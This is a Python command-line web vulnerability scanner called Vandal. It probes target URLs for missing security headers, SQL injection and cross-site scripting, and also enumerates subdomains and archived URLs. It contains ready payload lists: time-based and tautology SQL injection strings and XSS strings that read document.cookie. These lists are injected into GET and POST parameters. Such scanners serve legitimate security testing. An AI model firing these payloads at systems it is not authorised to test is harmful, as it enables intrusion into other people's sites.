#!/usr/bin/env python3
"""Vandal: web vulnerability scanner."""

import sys
import os
import time
import json
import random
import argparse
import itertools
import requests
from datetime import datetime, timezone
from typing import Optional, List, Dict, Any, Callable, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

__version__ = "1.0.0"

DEFAULT_TIMEOUT = 8
MAX_RETRIES = 5
BACKOFF_BASE = 2
MAX_PHASE_SECONDS = 180

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "error 1064 (42000)",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error at or near",
    "pg::syntaxerror",
    "ora-",
    "sqlite3::",
    "mysql_fetch",
    "sql error",
    "invalid query",
    "fatal error",
    "unexpected end of SQL command",
    "ole db provider",
    "microsoft ole db provider for odbc drivers",
]

ADV_SQL_PAYLOADS = [
    "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
    "admin'--",
    "';waitfor delay '0:0:8'--",
    "1'; SELECT pg_sleep(8)--",
    "' and sleep(8)--",
    "'||(SELECT pg_sleep(8))||'",
    "1;SELECT SLEEP(8); --",
    "1);SELECT SLEEP(8)--",
    "1' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' OR 'a'='a",
]

ADV_XSS_PAYLOADS = [
    "<svg/onload=alert(1337)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(document.domain)>",
    "<script>alert(document.cookie)</script>",
    "\"><img src=x onerror=alert(2)>",
    "<iframe src=javascript:alert(3)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<details open ontoggle=alert(1337)>",
    "<svg><script>alert(1)</script>",
    "\"><svg/onload=confirm(1)>",
    "<marquee onstart=alert(1)>test</marquee>",
    "<input autofocus onfocus=alert(1)>",
    "<video><source onerror=\"alert('xss')\"></video>",
    "<object data='javascript:alert(4)'>",
    "<a href='javascript:alert(1)'>click</a>",
    "<img src/onerror= prompt(document.cookie)>",
]

PRO_PARAM_WORDLIST = [
    "id", "user", "username", "userid", "email", "mail", "password", "token", "session",
    "access_token", "auth", "search", "query", "q", "page", "next", "redirect", "url",
    "callback", "code", "ref", "lang", "locale", "file", "filename", "path", "data",
    "json", "input", "content", "message", "comment", "desc", "description", "note",
    "amount", "price", "order", "number", "count", "hash", "key", "secret", "role",
    "admin", "debug", "cmd", "exec", "delete", "remove", "update", "edit", "modify",
    "from", "to", "target", "dest", "src", "type", "func", "method", "action",
]

SECURITY_HEADERS = [
    ("X-Frame-Options", "MEDIUM"),
    ("Content-Security-Policy", "HIGH"),
    ("X-XSS-Protection", "LOW"),
    ("Strict-Transport-Security", "HIGH"),
    ("X-Content-Type-Options", "MEDIUM"),
    ("Referrer-Policy", "LOW"),
    ("Permissions-Policy", "LOW"),
]

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def flatten_params(parsed_qs: Dict[str, list]) -> Dict[str, str]:
    """Convert parse_qs output (lists) to flat key:value dict."""
    return {k: v[0] if isinstance(v, list) else v for k, v in parsed_qs.items()}


def print_rainbow_logo(blink: bool = False, delay: float = 0.004) -> None:
    logo = [
        r" __  __                       __            ___      ",
        r"/\ \/\ \                     /\ \          /\_ \     ",
        r"\ \ \ \ \     __      ___    \_\ \     __  \//\ \    ",
        r" \ \ \ \ \  /'__`\  /' _ `\  /'_` \  /'__`\  \ \ \   ",
        r"  \ \ \_/ \/\ \L\.\_/\ \/\ \/\ \L\ \/\ \L\.\_ \_\ \_ ",
        r"   \ `\___/\ \__/.\_\ \_\ \_\ \___,_\ \__/.\_\/\____\\",
        r"    `\/__/  \/__/\/_/\/_/\/_/\/__,_ /\/__/\/_/\/____/",
        r"                                                     ",
    ]
    colors = [196, 202, 208, 220, 46, 51, 21, 93, 201, 129, 99, 208, 226, 51, 51, 21, 93, 201, 129]
    color_count = len(colors)
    for line in logo:
        for i, char in enumerate(line):
            color = colors[(i + random.randint(0, color_count - 1)) % color_count]
            ansi_color = f"\033[38;5;{color}m"
            blink_ansi = "\033[5m" if blink and char != " " else ""
            sys.stdout.write(f"{blink_ansi}{ansi_color}{char}\033[0m")
            sys.stdout.flush()
            if delay:
                time.sleep(delay)
        print()
    print("\033[97mBy\033[0m \033[38;5;196m44ghost44 <3\033[0m")
    print(f"\033[92mv{__version__}\033[0m\n")
    time.sleep(0.08)


def print_simple(msg: str, color: Optional[str] = None) -> None:
    colors = {
        "red": "38;5;196",
        "yellow": "93",
        "green": "92",
        "cyan": "96",
        "magenta": "95",
        "gray": "90",
        "white": "97",
    }
    if color and color in colors:
        print(f"\033[{colors[color]}m{msg}\033[0m")
    else:
        print(msg)


def is_valid_url(url: str) -> bool:
    return url.startswith(("http://", "https://")) and len(url) > 7


def show_warning() -> None:
    print("\033[1;38;5;196mWARNING: Only for ethical and legal use. The author is not responsible for misuse.\033[0m\n")


def is_sql_error(text: str) -> bool:
    lower = text.lower()
    return any(err in lower for err in SQL_ERRORS)


def clean_domain(url: str) -> str:
    return urlparse(url).netloc


# ---------------------------------------------------------------------------
# Session factory
# ---------------------------------------------------------------------------

def make_session(user_agent: Optional[str] = None) -> requests.Session:
    session = requests.Session()
    if user_agent:
        session.headers["User-Agent"] = user_agent
    return session


# ---------------------------------------------------------------------------
# WAF / rate-limit detection
# ---------------------------------------------------------------------------

_waf_warned = False


def check_waf(response: requests.Response, quiet: bool = False) -> bool:
    """Return True if the response looks like a WAF or rate-limit block."""
    global _waf_warned
    if response.status_code in (403, 429):
        if not _waf_warned and not quiet:
            print_simple(
                f"[!] Possible WAF or rate limit detected (HTTP {response.status_code}). Backing off.",
                "yellow",
            )
            _waf_warned = True
        return True
    return False


# ---------------------------------------------------------------------------
# Security headers check
# ---------------------------------------------------------------------------

def check_security_headers(
    url: str,
    session: requests.Session,
) -> List[Dict[str, str]]:
    """Check for 7 standard security headers. Returns list of findings."""
    findings: List[Dict[str, str]] = []
    try:
        response = session.get(url, timeout=DEFAULT_TIMEOUT)
        heads = response.headers
        for header_name, severity in SECURITY_HEADERS:
            if header_name not in heads:
                findings.append({
                    "type": "missing_header",
                    "header": header_name,
                    "severity": severity,
                    "url": url,
                })
    except Exception:
        pass
    return findings


# ---------------------------------------------------------------------------
# Progress bar
# ---------------------------------------------------------------------------

def progress_bar(
    current: int,
    total: int,
    step_name: str = "",
    start_time: Optional[float] = None,
) -> None:
    spinner = ["|", "/", "-", "\\"]
    percent = int(100 * (current / float(total))) if total else 0
    spin = spinner[current % len(spinner)]
    elapsed = int(time.time() - start_time) if start_time else 0
    eta = int((elapsed / current) * (total - current)) if current > 0 and total > 0 else 0
    sys.stdout.write(f"\r[{step_name}] {spin} {percent}% ({current}/{total}) elapsed:{elapsed}s eta:{eta}s")
    sys.stdout.flush()
    if current == total:
        print("")


# ---------------------------------------------------------------------------
# Backoff request
# ---------------------------------------------------------------------------

def backoff_request(
    session: requests.Session,
    method: str,
    url: str,
    **kwargs: Any,
) -> Optional[requests.Response]:
    for attempt in range(MAX_RETRIES):
        try:
            resp = session.request(method, url, **kwargs)
            return resp
        except Exception:
            time.sleep(BACKOFF_BASE ** attempt)
    return None


# ---------------------------------------------------------------------------
# Recon helpers
# ---------------------------------------------------------------------------

def show_response_details(response: requests.Response) -> None:
    print(f"Status code: {response.status_code}")
    if "Server" in response.headers:
        print(f"Server: {response.headers['Server']}")
    if response.is_redirect or response.status_code in [301, 302, 307, 308]:
        print(f"Redirect to: {response.headers.get('Location')}")
    print()


def find_subdomains(domain: str, session: requests.Session) -> None:
    print(f"Subdomains for {domain}:", end=" ")
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    resp = backoff_request(session, "GET", url, timeout=DEFAULT_TIMEOUT)
    if resp and resp.ok:
        try:
            subdomains = set(entry["name_value"].strip() for entry in resp.json())
            print(", ".join(list(subdomains)[:5]) + (" ..." if len(subdomains) > 5 else ""))
        except Exception:
            print_simple("Could not read subdomains.", "yellow")
    else:
        print_simple("Could not fetch subdomains.", "yellow")


def wayback_urls(domain: str, session: requests.Session) -> None:
    print(f"Wayback URLs for {domain}:", end=" ")
    url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey"
    resp = backoff_request(session, "GET", url, timeout=DEFAULT_TIMEOUT)
    if resp and resp.ok:
        try:
            urls = [
                entry[0]
                for entry in resp.json()[1:]
                if not entry[0].endswith((".jpg", ".png", ".css", ".ico", ".svg", ".gif"))
            ]
            print(", ".join(list(urls)[:5]) + (" ..." if len(urls) > 5 else ""))
        except Exception:
            print_simple("Could not read Wayback URLs.", "yellow")
    else:
        print_simple("Could not fetch Wayback URLs.", "yellow")


# ---------------------------------------------------------------------------
# Validate SQLi (fixed: no mutation of original params)
# ---------------------------------------------------------------------------

def validate_sqli(
    url: str,
    session: requests.Session,
    method: str,
    data: Optional[Dict[str, str]] = None,
) -> Tuple[bool, Optional[str]]:
    parsed = urlparse(url)
    if method == "POST" and data:
        params = dict(data)
    else:
        params = flatten_params(parse_qs(parsed.query))
    if not params:
        return False, "No parameters, cannot test advanced SQLi."

    key = list(params.keys())[0]
    time_payload = "';WAITFOR DELAY '0:0:8'--"
    error_payload = "'"

    def do_req(p: Dict[str, str]) -> Optional[requests.Response]:
        if method == "GET":
            q = urlencode(p)
            req_url = urlunparse(parsed._replace(query=q))
            return session.get(req_url, timeout=DEFAULT_TIMEOUT)
        else:
            return session.post(url, data=p, timeout=DEFAULT_TIMEOUT)

    try:
        resp_base = do_req(params)
        if resp_base is None:
            return False, "No response from base request."
        if resp_base.elapsed.total_seconds() > 5:
            return False, "Base response is too slow, skipping combo."
        t_base = resp_base.elapsed.total_seconds()

        time_params = dict(params)
        time_params[key] = time_payload
        resp_time = do_req(time_params)
        t_test = resp_time.elapsed.total_seconds() if resp_time else 0

        error_params = dict(params)
        error_params[key] = error_payload
        resp_error = do_req(error_params)
        if resp_error and is_sql_error(resp_error.text):
            snippet = next((err for err in SQL_ERRORS if err in resp_error.text.lower()), "")
            return True, f"Error-based SQLi detected ({method}): {url} parameter {key} (msg: {snippet})"
        if t_base > 0 and t_test > t_base + 6:
            return True, f"Time-based SQLi detected ({method}): {url} parameter {key} (delay: {t_test:.2f}s vs {t_base:.2f}s)"
    except Exception as e:
        return False, f"Error or timeout in combination: {e}"
    return False, None


# ---------------------------------------------------------------------------
# Unified payload scan
# ---------------------------------------------------------------------------

def payload_scan(
    url: str,
    session: requests.Session,
    payloads: List[str],
    check_fn: Callable[[requests.Response, str], bool],
    label: str,
    method: str = "GET",
    max_combo: int = 1,
    mode: str = "fast",
    max_phase_seconds: int = 60,
    delay: float = 0.01,
    quiet: bool = False,
) -> List[Dict[str, Any]]:
    """
    Generic scan that injects each payload into each parameter combo.
    check_fn(response, payload) -> True means a finding.
    Returns list of finding dicts with severity.
    """
    parsed = urlparse(url)
    findings: List[Dict[str, Any]] = []
    start_time = time.time()

    # Build param combos
    if mode == "fast":
        if method == "GET":
            real_params = flatten_params(parse_qs(parsed.query))
            if real_params:
                combos = [real_params]
            else:
                combos = [{PRO_PARAM_WORDLIST[0]: "test"}]
        else:
            combos = [{PRO_PARAM_WORDLIST[0]: "test"}]
        scan_payloads = payloads[:2]
    else:
        if method == "POST":
            combos = []
            for num in range(1, max_combo + 1):
                for keys in itertools.combinations(PRO_PARAM_WORDLIST, num):
                    combos.append({k: "test" for k in keys})
        else:
            real_params = flatten_params(parse_qs(parsed.query))
            if real_params:
                keys = list(real_params.keys())
                combos = []
                for length in range(1, min(len(keys) + 1, max_combo + 1)):
                    for subset in itertools.combinations(keys, length):
                        combos.append({k: real_params[k] for k in subset})
            else:
                combos = [{PRO_PARAM_WORDLIST[0]: "test"}]
        scan_payloads = payloads

    total = len(combos) * len(scan_payloads) * max(1, max(len(c) for c in combos) if combos else 1)
    # Recalculate properly
    total = sum(len(c) * len(scan_payloads) for c in combos)
    if total > 50000 and not quiet:
        print(f"\n[!] Warning: this phase may take many minutes ({total} tests)...\n")

    count = 0
    last_print = time.time()

    for pset in combos:
        for key in pset:
            for payload in scan_payloads:
                count += 1
                if not quiet and (count % 10 == 0 or count == total or (time.time() - last_print > 2)):
                    progress_bar(count, total, f"{method} {label}", start_time)
                    last_print = time.time()

                if time.time() - start_time > max_phase_seconds:
                    if not quiet:
                        print_simple("Phase interrupted (timeout).", "yellow")
                    return findings

                test_params = dict(pset)
                test_params[key] = payload

                try:
                    if method == "GET":
                        q = urlencode(test_params)
                        test_url = urlunparse(parsed._replace(query=q))
                        resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                    else:
                        resp = session.post(url, data=test_params, timeout=DEFAULT_TIMEOUT)

                    if check_waf(resp, quiet=quiet):
                        time.sleep(2)
                        continue

                    if check_fn(resp, payload):
                        severity = "HIGH" if label == "SQLi" else "MEDIUM"
                        finding = {
                            "type": label.lower().replace(" ", "_"),
                            "severity": severity,
                            "method": method,
                            "parameter": key,
                            "payload": payload,
                            "url": url,
                        }
                        findings.append(finding)
                        if not quiet:
                            print_simple(
                                f"{label} found ({method} {key})! {url}",
                                "red",
                            )
                except Exception:
                    pass

                if delay > 0:
                    time.sleep(delay)

    if not quiet:
        progress_bar(total, total, f"{method} {label}", start_time)
    return findings


def sqli_check(resp: requests.Response, payload: str) -> bool:
    return is_sql_error(resp.text) or resp.status_code >= 500


def xss_check(resp: requests.Response, payload: str) -> bool:
    return payload in resp.text


# ---------------------------------------------------------------------------
# Main scan
# ---------------------------------------------------------------------------

def scan_url(
    url: str,
    session: requests.Session,
    max_combo: int = 1,
    mode: str = "fast",
    max_phase_seconds: int = 60,
    delay: float = 0.01,
    quiet: bool = False,
) -> List[Dict[str, Any]]:
    """Scan a single URL and return all findings."""
    if not is_valid_url(url):
        print_simple("Invalid URL.", "red")
        return []

    all_findings: List[Dict[str, Any]] = []

    if not quiet:
        print_simple(f"Scanning URL: {url}...", "green")

    try:
        response = session.get(url, timeout=DEFAULT_TIMEOUT)
        if not quiet:
            show_response_details(response)
    except Exception as e:
        print_simple(f"Error connecting to {url}: {e}", "red")
        return []

    # Security headers
    phase_start = time.time()
    if not quiet:
        print("Checking security headers...")
    header_findings = check_security_headers(url, session)
    all_findings.extend(header_findings)
    phase_elapsed = time.time() - phase_start
    if not quiet:
        if header_findings:
            for hf in header_findings:
                print_simple(f"  Missing: {hf['header']} (severity: {hf['severity']})", "yellow")
        else:
            print_simple("All 7 security headers present.", "green")
        print_simple(f"  Headers check took {phase_elapsed:.1f}s", "gray")

    # GET SQLi
    phase_start = time.time()
    if not quiet:
        print(f"\n[GET] SQLi scan")
    sqli_get = payload_scan(
        url, session, ADV_SQL_PAYLOADS, sqli_check, "SQLi",
        method="GET", max_combo=max_combo, mode=mode,
        max_phase_seconds=max_phase_seconds, delay=delay, quiet=quiet,
    )
    all_findings.extend(sqli_get)
    if not quiet:
        if not sqli_get:
            print_simple("No SQLi vulnerabilities found (GET).", "green")
        print_simple(f"  Phase took {time.time() - phase_start:.1f}s", "gray")

    # GET XSS
    phase_start = time.time()
    if not quiet:
        print(f"\n[GET] XSS scan")
    xss_get = payload_scan(
        url, session, ADV_XSS_PAYLOADS, xss_check, "XSS",
        method="GET", max_combo=max_combo, mode=mode,
        max_phase_seconds=max_phase_seconds, delay=delay, quiet=quiet,
    )
    all_findings.extend(xss_get)
    if not quiet:
        if not xss_get:
            print_simple("No XSS vulnerabilities found (GET).", "green")
        print_simple(f"  Phase took {time.time() - phase_start:.1f}s", "gray")

    # POST SQLi
    phase_start = time.time()
    if not quiet:
        print(f"\n[POST] SQLi scan")
    sqli_post = payload_scan(
        url, session, ADV_SQL_PAYLOADS, sqli_check, "SQLi",
        method="POST", max_combo=max_combo, mode=mode,
        max_phase_seconds=max_phase_seconds, delay=delay, quiet=quiet,
    )
    all_findings.extend(sqli_post)
    if not quiet:
        if not sqli_post:
            print_simple("No SQLi vulnerabilities found (POST).", "green")
        print_simple(f"  Phase took {time.time() - phase_start:.1f}s", "gray")

    # POST XSS
    phase_start = time.time()
    if not quiet:
        print(f"\n[POST] XSS scan")
    xss_post = payload_scan(
        url, session, ADV_XSS_PAYLOADS, xss_check, "XSS",
        method="POST", max_combo=max_combo, mode=mode,
        max_phase_seconds=max_phase_seconds, delay=delay, quiet=quiet,
    )
    all_findings.extend(xss_post)
    if not quiet:
        if not xss_post:
            print_simple("No XSS vulnerabilities found (POST).", "green")
        print_simple(f"  Phase took {time.time() - phase_start:.1f}s", "gray")

    return all_findings


# ---------------------------------------------------------------------------
# JSON output
# ---------------------------------------------------------------------------

def write_json_output(filepath: str, targets: List[str], findings: List[Dict[str, Any]]) -> None:
    report = {
        "tool": "vandal",
        "version": __version__,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "targets": targets,
        "total_findings": len(findings),
        "findings": findings,
    }
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="vandal.py",
        description="Vandal: web vulnerability scanner",
    )
    parser.add_argument(
        "urls", nargs="*", metavar="URL",
        help="One or more target URLs to scan",
    )
    parser.add_argument(
        "--full", action="store_true",
        help="Full scan mode (slower, more thorough)",
    )
    parser.add_argument(
        "--user-agent", type=str, default=None,
        help="Custom User-Agent header",
    )
    parser.add_argument(
        "--delay", type=float, default=0.01,
        help="Delay between requests in seconds (default 0.01)",
    )
    parser.add_argument(
        "--output", "-o", type=str, default=None,
        help="Write findings to JSON file",
    )
    parser.add_argument(
        "--quiet", "-q", action="store_true",
        help="Suppress progress bars and banners",
    )
    parser.add_argument(
        "--version", "-V", action="version",
        version=f"%(prog)s {__version__}",
    )
    return parser


def main(argv: Optional[List[str]] = None) -> None:
    parser = build_parser()
    args = parser.parse_args(argv)

    if not args.urls:
        parser.print_help()
        sys.exit(1)

    if not args.quiet:
        print_rainbow_logo(blink=True, delay=0.001)
        show_warning()

    mode = "full" if args.full else "fast"
    max_combo = 3 if mode == "full" else 1
    max_phase_seconds = MAX_PHASE_SECONDS if mode == "full" else 60

    session = make_session(args.user_agent)
    all_findings: List[Dict[str, Any]] = []

    global _waf_warned

    for url in args.urls:
        _waf_warned = False
        findings = scan_url(
            url, session,
            max_combo=max_combo,
            mode=mode,
            max_phase_seconds=max_phase_seconds,
            delay=args.delay,
            quiet=args.quiet,
        )
        all_findings.extend(findings)

        domain = clean_domain(url)
        if not args.quiet:
            find_subdomains(domain, session)
            wayback_urls(domain, session)
            print()

        if args.delay > 0:
            time.sleep(args.delay)

    # Summary
    if not args.quiet:
        print_simple(f"\nScan complete. {len(all_findings)} finding(s) across {len(args.urls)} target(s).", "cyan")

    if args.output:
        write_json_output(args.output, args.urls, all_findings)
        if not args.quiet:
            print_simple(f"Results written to {args.output}", "green")


if __name__ == "__main__":
    main()
